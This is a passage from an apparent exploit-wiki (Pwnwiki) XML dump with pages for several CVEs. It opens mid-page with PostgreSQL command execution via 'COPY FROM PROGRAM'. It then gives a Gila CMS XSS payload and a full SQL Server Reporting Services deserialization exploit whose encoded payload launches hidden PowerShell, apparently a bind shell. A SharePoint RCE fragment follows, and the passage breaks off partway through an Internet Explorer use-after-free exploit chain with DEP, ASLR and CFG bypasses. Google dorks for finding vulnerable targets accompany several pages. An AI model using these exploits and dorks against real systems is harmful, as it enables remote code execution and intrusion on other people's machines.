啟動漏洞環境後， 將開啟Postgres默認的5432端口，默認賬號密碼為postgres/postgres， 連接到數據庫。
&lt;/translate&gt;
&lt;pre&gt;
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
FROM PROGRAM語句將執行命令id並將結果保存在cmd_exec表中。
&lt;/translate&gt;</text>
      <sha1>pkqec11qf0y220e2x4i05jgk9nzwq58</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-9647 Gila CMS 1.9.1 XSS漏洞</title>
    <ns>0</ns>
    <id>1632</id>
    <revision>
      <id>2036</id>
      <timestamp>2021-05-02T05:01:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: Gila CMS (search) Cross Site Scripting # Google Dork: intext:"Powered By Gila CMS" # Date: 11.03.2019 # Exploit Author: Ahmet Ümit BAYRAM # Ven..."</comment>
      <origin>2036</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="564" sha1="4sc2663kww957aaq5rdonu17v4q0unz" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: Gila CMS (search) Cross Site Scripting
# Google Dork: intext:"Powered By Gila CMS"
# Date: 11.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://gilacms.com
# Software Link: https://gilacms.com/packages/downloadRelease/1.9.1.zip
# Demo Site: https://gilacms.com/demo/
# Version: 1.9.1
# Tested on: Kali Linux
# CVE: CVE-2019-9647

# Vulnerable Parameter: search

# Payload: &lt;--`&lt;img/src=` onerror=confirm``&gt; --!&gt;

# GET Request: http://localhost/?search=&lt;--`&lt;img/src=` onerror=confirm``&gt; --!&gt;
            
&lt;/pre&gt;</text>
      <sha1>4sc2663kww957aaq5rdonu17v4q0unz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-0618 Microsoft SQL Server Reporting Services 2016 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1193</id>
    <revision>
      <id>1497</id>
      <timestamp>2021-04-11T01:11:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Microsoft SQL Server Reporting Services 2016 - Remote Code Execution # Google Dork: inurl:ReportViewer.aspx # Date: 2020-09-17 # Exploit Author:..."</comment>
      <origin>1497</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10604" sha1="f0t6l1in1xg60llawz4j4r2drrk9pqc" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Microsoft SQL Server Reporting Services 2016 - Remote Code Execution
# Google Dork: inurl:ReportViewer.aspx
# Date: 2020-09-17
# Exploit Author: West Shepherd
# Vendor Homepage: https://www.microsoft.com
# Version: Microsoft SQL Server 2016 32-bit/x64 SP2 (CU/GDR),
Microsoft SQL Server 2014 32-bit/x64 SP3 (CU/GDR), Microsoft SQL
Server 2012 32-bit/x64 SP2 (QFE)
# Tested on: Windows 2016
# CVE : CVE-2020-0618
# Credit goes to Soroush Dalili
# Source:
# https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0618
# https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/

#!/usr/bin/python
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_ntlm import HttpNtlmAuth
import argparse, requests, logging
from bs4 import BeautifulSoup
from sys import argv, exit, stderr, stdout

# to create a payload (default is bindshell on 0.0.0.0:65535):
# .\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "command..."


class Exploit:
    payload = '/wEy4hYAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAAqAUvYyBwb3dlcnNoZWxsLmV4ZSAtZXhlYyBieXBhc3MgLW5vbmludGVyYWN0aXZlIC1ub2V4aXQgLXdpbmRvd3N0eWxlIGhpZGRlbiAtYyBpZXgoW3N5c3RlbS50ZXh0LmVuY29kaW5nXTo6ZGVmYXVsdC5nZXRzdHJpbmcoW3N5c3RlbS5jb252ZXJ0XTo6ZnJvbWJhc2U2NHN0cmluZygnSkdFOVczTjVjM1JsYlM1dVpYUXVjMjlqYTJWMGN5NTBZM0JzYVhOMFpXNWxjbDAyTlRVek5Uc2tZUzV6ZEdGeWRDZ3BPeVJqUFNSaExtRmpZMlZ3ZEhSamNHTnNhV1Z1ZENncE95UmxQU1JqTG1kbGRITjBjbVZoYlNncE8xdGllWFJsVzExZEpHYzlNQzR1TmpVMU16VjhKWHN3ZlR0M2FHbHNaU2dvSkdnOUpHVXVjbVZoWkNna1p5d3dMQ1JuTG14bGJtZDBhQ2twTFc1bElEQXBleVJzUFNodVpYY3RiMkpxWldOMElDMTBlWEJsYm1GdFpTQnplWE4wWlcwdWRHVjRkQzVoYzJOcGFXVnVZMjlrYVc1bktTNW5aWFJ6ZEhKcGJtY29KR2NzTUN3a2FDazdKRzQ5S0dsbGVDQWtiQ0F5UGlZeGZHOTFkQzF6ZEhKcGJtY3BPeVJ3UFNJa0tDUnVLU1FvS0hCM1pDa3VjR0YwYUNrK0lqc2tjVDBvVzNSbGVIUXVaVzVqYjJScGJtZGRPanBoYzJOcGFTa3VaMlYwWW5sMFpYTW9KSEFwT3lSbExuZHlhWFJsS0NSeExEQXNKSEV1YkdWdVozUm9LVHNrWlM1bWJIVnphQ2dwZlRza1l5NWpiRzl6WlNncE95UmhMbk4wYjNBb0tUc05DZz09JykpKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL'
    timeout = 0.5
    cookies = {}
    params = {}

    def __init__(self, opt):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.username = '%s\\%s' % (opt.domain, opt.username)
        self.target = '%s%s' % (opt.target, opt.path)
        self.password = opt.password
        self.session = requests.session()
        self.redirect = opt.redirect
        self.proxies = {
            'http': 'http://%s' % opt.proxy,
            'https': 'http://%s' % opt.proxy
        } if opt.proxy != '' else {}
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.form = {
            '__VIEWSTATE': '',
            'NavigationCorrector$PageState': 'NeedsCorrection',
            'NavigationCorrector$ViewState': self.payload
        }
        if opt.debug:
            self.debug()

    def info(self, message):
        stdout.write('[+] %s\n' % str(message))
        return self

    def error(self, message):
        stderr.write('[-] error: %s\n' % str(message))
        return self

    def doGet(self, url, params=None, values=None):
        self.info('sending get request to %s' % url)
        try:
            return self.session.get(
                url=url,
                verify=False,
                allow_redirects=self.redirect,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxies,
                data=values,
                params=params,
                auth=HttpNtlmAuth(self.username, self.password)
            ) if self.username != '\\' else self.session.get(
                url=url,
                verify=False,
                allow_redirects=self.redirect,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxies,
                data=values,
                params=params
            )
        except Exception as err:
            self.error(err)

    def doPost(self, url, values=None, params=None):
        self.info('sending post request to %s' % url)
        try:
            return self.session.post(
                url=url,
                data=values,
                verify=False,
                allow_redirects=self.redirect,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxies,
                params=params,
                auth=HttpNtlmAuth(self.username, self.password)
            ) if self.username != '\\' else self.session.post(
                url=url,
                data=values,
                verify=False,
                allow_redirects=self.redirect,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxies,
                params=params
            )
        except Exception as err:
            self.error(err)

    def parsePage(self, content):
        self.info('parsing form values')
        soup = BeautifulSoup(content, 'lxml')
        for tag in soup.select('input'):
            try:
                self.form[tag['name']] = tag['value']
            except Exception as err:
                self.error(err)
        return self

    def debug(self):
        self.info('debugging enabled')
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def getForm(self):
        self.info('retrieving form values')
        resp = self.doGet(url=self.target)
        self.parsePage(content=resp.content)
        return self

    def exploit(self):
        self.info('exploiting target')
        resp = self.doPost(url=self.target, params=self.params,
values=self.form)
        self.info('received response %d' % resp.status_code)
        return self


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='CVE-2020-0618 SQL Server Reporting Services
ViewState Deserialization exploit',
        add_help=True
    )
    try:
        parser.add_argument('-target', action='store', help='Target
address: http(s)://target.com ')
        parser.add_argument('-username', action='store', default='',
help='Username to use: first.last')
        parser.add_argument('-domain', action='store', default='',
help='User domain to use: domain.local')
        parser.add_argument('-password', action='store', default='',
help='Password to use: Summer2020')
        parser.add_argument('-debug', action='store', default=False,
help='Enable debugging: False')
        parser.add_argument('-redirect', action='store',
default=False, help='Follow redirects: False')
        parser.add_argument('-proxy', action='store', default='',
help='Enable proxy: 10.10.10.10:8080')
        parser.add_argument('-path', action='store',
default='/ReportServer/pages/ReportViewer.aspx', help='Path to page')

        if len(argv) == 1:
            parser.print_help()
            exit(1)

        options = parser.parse_args()
        Exploit(opt=options).exploit()

    except Exception as error:
        stderr.write('[-] error in main %s\n' % str(error))


Regards,

West Shepherd
OSWE | OSCE | OSCP | OSWP | CEH | Security+
West Lee Shepherd, LLC
            
&lt;/pre&gt;</text>
      <sha1>f0t6l1in1xg60llawz4j4r2drrk9pqc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-0646 SharePoint RCE漏洞</title>
    <ns>0</ns>
    <id>266</id>
    <revision>
      <id>414</id>
      <timestamp>2021-03-18T09:49:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; CallExternalMethodActivity x:Name="foo"  ....System.Diagnostics.Process.Start("cmd.exe", &lt;/pre&gt;  ==Google Dork== &lt;pre&gt; .sharepoint.com/_vti_bin/webpartpages/asmx..."</comment>
      <origin>414</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="201" sha1="51uyr0iht3uex7mkohf1bmqmj23b1ok" xml:space="preserve">==POC==
&lt;pre&gt;
CallExternalMethodActivity x:Name="foo" 
....System.Diagnostics.Process.Start("cmd.exe",
&lt;/pre&gt;

==Google Dork==
&lt;pre&gt;
.sharepoint.com/_vti_bin/webpartpages/asmx -docs -msdn -mdsec
&lt;/pre&gt;</text>
      <sha1>51uyr0iht3uex7mkohf1bmqmj23b1ok</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-0674 Microsoft Internet Explorer 8/11 and WPAD service 'Jscript.dll' Use-After-Free</title>
    <ns>0</ns>
    <id>2366</id>
    <revision>
      <id>2848</id>
      <timestamp>2021-05-13T09:30:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Microsoft Internet Explorer 8/11 and WPAD service 'Jscript.dll' - Use-After-Free # Date: 2021-05-04 # Exploit Author: deadlock (Forrest Orr) # V..."</comment>
      <origin>2848</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="54564" sha1="ageqva178g587sejjjqmpcukb05w53i" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Microsoft Internet Explorer 8/11 and WPAD service 'Jscript.dll' - Use-After-Free
# Date: 2021-05-04
# Exploit Author: deadlock (Forrest Orr)
# Vendor Homepage: https://www.microsoft.com/
# Software Link: https://www.microsoft.com/en-gb/download/internet-explorer.aspx
# Versions: IE 8-11 (64-bit) as well as the WPAD service (64-bit) on Windows 7 and 8.1 x64
# Tested on: Windows 7 x64, Windows 8.1 x64
# CVE: CVE-2020-0674
# Bypasses: DEP, ASLR, CFG
# Original (IE-only/Windows 7-only) exploit credits: maxpl0it
# Full explain chain writeup: https://github.com/forrest-orr/DoubleStar

/*
________                 ___.    .__                 _________  __
\______ \    ____   __ __\_ |__  |  |    ____       /   _____/_/  |_ _____  _______
 |    |  \  /  _ \ |  |  \| __ \ |  |  _/ __ \      \_____  \ \   __\\__  \ \_  __ \
 |    `   \(  &lt;_&gt; )|  |  /| \_\ \|  |__\  ___/      /        \ |  |   / __ \_|  | \/
/_______  / \____/ |____/ |___  /|____/ \___  &gt;    /_______  / |__|  (____  /|__|
        \/                    \/            \/             \/             \/
Windows 8.1 IE/Firefox RCE -&gt; Sandbox Escape -&gt; SYSTEM EoP Exploit Chain

                            ______________
                            | Remote PAC | 
                            |____________|  
                                   ^
                                   | HTTPS
_______________  RPC/ALPC   _______________   RPC/ALPC   _______________
| firefox.exe | ----------&gt; | svchost.exe | -----------&gt; | spoolsv.exe |
|_____________|             |_____________| &lt;----------- |_____________|
                                   |          RPC/Pipe
                                   |
               _______________     | 
               | malware.exe | &lt;---| Execute impersonating NT AUTHORY\SYSTEM
               |_____________|

~

Component

JavaScript file containing CVE-2020-0674 UAF targetting IE8/11 and WPAD 64-bit
on Windows 7 and 8.1 x64. It may be used as an alternative RCE attack vector in
the exploit chain (in which case it should be used in conjunction with the
stage two WPAD sandbox escape shellcode), as a PAC file (see settings) or a
stand-alone IE8/11 64-bit exploit. Note that if used as the initial RCE in the
full exploit chain, Windows 7 is unsupported by the required stage two WPAD
sandbox escape shellcode.

________________  CVE-2020-0674 _______________________  RPC/ALPC   _______________
| iexplore.exe | -------------&gt; | WPAD sandbox escape | ----------&gt; | svchost.exe |
|______________|                | shellcode (heap)    |             |_____________|
                                |_____________________|              

~

Overview

This is a 64-bit adaptation of CVE-2020-0674 which can exploit both IE8/11
64-bit as well as the WPAD service on Windows 7 and 8.1 x64. It has bypasses
for DEP, ASLR, and CFG. It uses dynamic ROP chain creation for its RIP
hijack and stack pivot. Notably, this exploit does not contain bypasses for
Windows Exploit Guard or EMET 5.5 and does not work on IE11 or WPAD in
Windows 10.

~

Design

The UAF is a result of two untracked variables passed to a comparator for the
Array.sort method, which can then be used to reference VAR structs within
allocated GcBlock regions which can subsequently be freed via garbage
collection. Control of the memory of VAR structs with active JS var
references in the runtime script is then used for arbitrary read (via BSTR)
and addrof primitives.

Ultimately the exploit aims to use KERNEL32.DLL!VirtualProtect to disable DEP
on a user defined shellcode stored within a BSTR on the heap. This is achieved
through use of NTDLL.DLL!NtContinue, an artificial stack (built on the heap)
and a dynamically resolved stack pivot ROP gadget.

NTDLL.DLL!NtContinue --------------------&gt; RIP = &lt;MSVCRT.DLL!0x00019baf&gt; | MOV RSP, R11; RET
                                           RCX = Shellcode address
                                           RDX = Shellcode size
                                           R8 = 0x40
                                           R9 = Leaked address of BSTR to hold out param    
                                           RSP = Real stack pointer             
                                           R11 = Artificial stack
|-----------------------------|            ^
| 2MB stack space (heap)      |            |
|-----------------------------|            |
| Heap header/BSTR len align  |            |
|-----------------------------|            |
| KERNEL32.DLL!VirtualProtect | &lt;----------|
|-----------------------------|
| Shellcode return address    ]
|-----------------------------|   

The logic flow is:
1. A fake object with a fake vtable is constructed containing the address
   of NTDLL.DLL!NtContinue as its "typeof" method pointer. This primitive
   is used for RIP hijack in conjunction with a pointer to a specially
   crafted CONTEXT structure in RCX as its parameter. 
2. NtContinue changes RIP to a stack pivot gadget and sets up the parameters
   to KERNEL32.DLL!VirtualProtect.
3. The address of VirtualProtect is the first return address to be
   consumed on the new (artificial) stack after the stack pivot.
4. VirtualProtect disables DEP on the shellcode region and returns to that
   same (now +RWX) shellcode address stored as the second return address on
   the pivoted stack.
   
Notably, the stack pivot was needed here due to the presence of CFG on
Windows 8.1, which prevents NtContinue from being used to change RSP to an
address which falls outside the stack start/end addresses specified in the
TEB. On Windows 7 this is a non-issue. Furthermore, it required a leak of RSP
to be planted in the CONTEXT structure so that NtContinue would consider its
new RSP valid.

The exploit will not work on Windows 10 due to enhanced protection by CFG:
Windows 10 has blacklisted NTDLL.DLL!NtContinue to CFG by default.
        
~

Credits

maxpl0it      - for doing the original analysis and PoC for CVE-2020-0674
                on IE8/11 on Windows 7 x64.
            
HackSys Team  - for tips on the WPAD service and low level JS debugging.
                                                                    
*/

////////
////////
// Global settings
////////

var PayloadType = "shellcode"; // Can be "shellcode" or "winexec"
var CommandStr = "\u3a63\u775c\u6e69\u6f64\u7377\u6e5c\u746f\u7065\u6461\u652e\u6578"; // The ASCII string to be executed via WinExec if the relevant payload type is selected - C:\Windows\notepad.exe
var WindowsVersion = 8.1; // Can be 8.1 or 7. Only the 64-bit versions of these OS are supported.
var PacFile = false;
var EnableDebug = false;
var EnableTimers = false;
var AlertOutput = false;

////////
////////
// Stack-sensitive array initialization logic
////////

var SortArray = new Array(); // Initializing this locally rather than globally causes stack issues, particularly in regards to WPAD.
for(var i = 0; i &lt;= 150; i++) SortArray[i] = [0, 0]; // An array of arrays to be sorted by glitched sort comparator

////////
////////
// Debug/timer code
////////

var TimeStart;
var ReadCount;
var ScriptTimeStart = new Date().getTime();

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) { // When debug is enabled the distinction between "stack overflow" and "out of memory" errors are lost: console always determines there to be an "out of memory" condition even though this only sppears after scoping of SortDepth is changed.
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

////////
////////
// UAF/untracked variable creation code
////////

var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 200 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 0; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
var SortDepth = 0;
    
function GlitchedComparator(Untracked1, Untracked2) {
    Untracked1 = VarSpray[SortDepth*2];
    Untracked2 = VarSpray[SortDepth*2 + 1];
    
    if(SortDepth &gt;= 150) {
        VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
        CollectGarbage(); // Free the GcBlocks
        UntrackedVarSet.push(Untracked1);
        UntrackedVarSet.push(Untracked2);
    }
    else {
        SortDepth += 1;
        
        // There is a difference between the stack size between WPAD and Internet Explorer. In IE, a stack overflow exception will occur around depth 250 however in WPAD it will occur on a depth of less than 150, ensuring a stack overflow exception/alert will be thrown in the exploit. This try/catch in conjunction with a global initialization of the sort array allows the depth to be sufficient to produce an untracked var which will overlap with the type confusion offset in the re-claimed GcBlock.
        
        try {
            SortArray[SortDepth].sort(GlitchedComparator);
        }
        catch(ex) {
            VarSpray = new Array(); // Erase references to sprayed vars within GcBlocks
            CollectGarbage(); // Free the GcBlocks
        }
        
        UntrackedVarSet.push(Untracked1);
        UntrackedVarSet.push(Untracked2);
    }
    
    return 0;
}

function NewUntrackedVarSet() {
    SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(var i = 0; i &lt; NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(var i = 0; i &lt; VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedComparator); // Two untracked vars will be passed to this method by the JS engine
}

////////
////////
// UAF re-claim/mutable variable code (used for arbitrary read)
////////

var AnchorObjectsBackup;
var LeakedAnchorIndex = -1;
var SizerPropName = Array(570).join('A');
var MutableVar;
var ReClaimNameList;
var InitialReClaim = true;

function ReClaimIndexNameList(Value, PropertyName) {
    CollectGarbage(); // Cleanup - note that removing this has not damaged stability of the exploit in any of my own tests and its removal significantly improved exploit performance (each arbitrary read is about twice as fast). I've left it here from maxspl0it's original version of the exploit to ensure stability.
    AnchorObjectsBackup[LeakedAnchorIndex] = null; // Delete the anchor associated with the leaked NameList allocation
    CollectGarbage(); // Free the leaked NameList
    AnchorObjectsBackup[LeakedAnchorIndex] = new Object();
    AnchorObjectsBackup[LeakedAnchorIndex][SizerPropName] = 1; // 0x239 property name size for 0x970 NameList allocation size
    AnchorObjectsBackup[LeakedAnchorIndex]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
    AnchorObjectsBackup[LeakedAnchorIndex]["\u0005"] = 1;
    AnchorObjectsBackup[LeakedAnchorIndex][PropertyName] = Value; // The mutable variable
    ReadCount++;
}

function ReClaimBackupNameLists(Value, PropertyName) {
    var PrecisionReClaimAllocCount = 500; // This is the number of re-claim attempts that are needed for a precision re-claim of a single freed region, not hundreds such as in the case of the GcBlock/type confusion re-claims. On IE8/11 300 is plenty, on WPAD 500 seems to be more stable. 
    CollectGarbage(); // Cleanup
    
    if(InitialReClaim) {
        AnchorObjectsBackup[LeakedAnchorIndex] = null;
        InitialReClaim = false;
        PrecisionReClaimAllocCount -= 1;
        AnchorObjectsBackup[LeakedAnchorIndex] = new Object(); // Clog the index
    }
    
    for(var i = 0; i &lt; PrecisionReClaimAllocCount; i++) {
        if(i != LeakedAnchorIndex) AnchorObjectsBackup[i] = null;
    }
    
    CollectGarbage(); // Free the leaked NameList
    
    for(var i = 0; i &lt; PrecisionReClaimAllocCount; i++) {
        if(i != LeakedAnchorIndex) AnchorObjectsBackup[i] = new Object();
        AnchorObjectsBackup[i][SizerPropName] = 1; // 0x239 property name size for 0x970 NameList allocation size
        AnchorObjectsBackup[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        AnchorObjectsBackup[i]["\u0005"] = 1;
        AnchorObjectsBackup[i][PropertyName] = Value; // The mutable variable
    }
    
    ReadCount++;
}

function CreateVar64(Type, ObjPtrLow, ObjPtrHigh, NextPtrLow, NextPtrHigh) {
    var CharCodes = new Array();
    
    CharCodes.push(
         // Type
        Type, 0, 0, 0,
        // Object pointer
        ObjPtrLow &amp; 0xffff, (ObjPtrLow &gt;&gt; 16) &amp; 0xffff, ObjPtrHigh &amp; 0xffff, (ObjPtrHigh &gt;&gt; 16) &amp; 0xffff,
        // Next pointer
        NextPtrLow &amp; 0xffff, (NextPtrLow &gt;&gt; 16) &amp; 0xffff, NextPtrHigh &amp; 0xffff, (NextPtrHigh &gt;&gt; 16) &amp; 0xffff);
        
    return String.fromCharCode.apply(null, CharCodes);
}

function LeakByte64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return (MutableVar.length &gt;&gt; 15) &amp; 0xff; // Shift to align and get the byte.
}

function LeakWord64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    return ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
}

function LeakDword64(Address) {
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 2, Address.high, 0, 0)); // +2 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var LowWord = ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
    ReClaimNameList(0, CreateVar64(0x8, Address.low + 4, Address.high, 0, 0)); // +4 for BSTR length adjustment (only a WORD at a time can be cleanly read despite being a 32-bit field)
    var HighWord = ((MutableVar.length &gt;&gt; 15) &amp; 0xff) + (((MutableVar.length &gt;&gt; 23) &amp; 0xff) &lt;&lt; 8);
    return LowWord + (HighWord &lt;&lt; 16);
}

function LeakQword64(Address) {
